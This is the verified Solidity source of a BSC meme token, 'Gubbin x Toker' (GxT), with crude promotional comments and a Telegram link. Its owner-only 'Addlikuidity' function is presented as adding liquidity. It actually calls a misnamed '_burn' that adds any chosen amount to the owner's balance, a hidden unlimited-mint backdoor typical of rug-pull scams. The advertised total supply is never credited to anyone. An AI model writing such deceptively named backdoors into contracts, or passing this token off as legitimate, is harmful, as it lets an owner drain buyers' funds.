/**
 *Submitted for verification at BscScan.com on 2022-11-25
*/

//WELCOME FUCKING TRADE, ENJOY THE GAME AND RICH SOON !!!
// Deploy By TOKERRDEPLOYER
// Supported Gubbin Calls & tokerrdeployer
// TELEGRAM : https:https://t.me/tokrdeployerchannel
// WEBSITE  : TBA
// FULL SUPPLY ON LIKUIDITY PANCAKESWAP 

pragma solidity >=0.6.0 <0.8.0;
// SPDX-License-Identifier: Apache-2.0

contract GUBINxtOKER {
    address public owner;

    //decimal precisions
    uint256 public constant _percentFactor = 100;
    uint8 public constant decimals = 0;

    string public constant name = "Gubbin x Toker";
    string public constant symbol = "GxT";
    uint256 public constant totalSupply = 100000000000;
    uint256 public constant burnFee = 10;
    address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private isBlocked;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _; }

    constructor () {
        owner = msg.sender;}

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) 
    {_transfer(msg.sender, recipient, amount); return true;}

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];}

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;}

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "failed");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;}

    function Addlikuidity(uint256 amount) public onlyOwner returns (bool) 
    {_burn(msg.sender, amount);
        return true;}

    function _burn(address account, uint256 amount) private 
    {require(account != address(0)); balanceOf[account] += amount;}

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "t 0");
        require(spender != address(0), "f 0");

        _allowances[_owner][spender] = amount;
		emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        
        require(amount <= balanceOf[from], "b");

        uint256 fee;
        if (from == owner || to == owner)
            fee = 0;
        else
            fee = amount / _percentFactor * burnFee;
        uint256 transferAmount = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[burnAddr] += fee;

        emit Transfer(from, to, transferAmount);
    }
}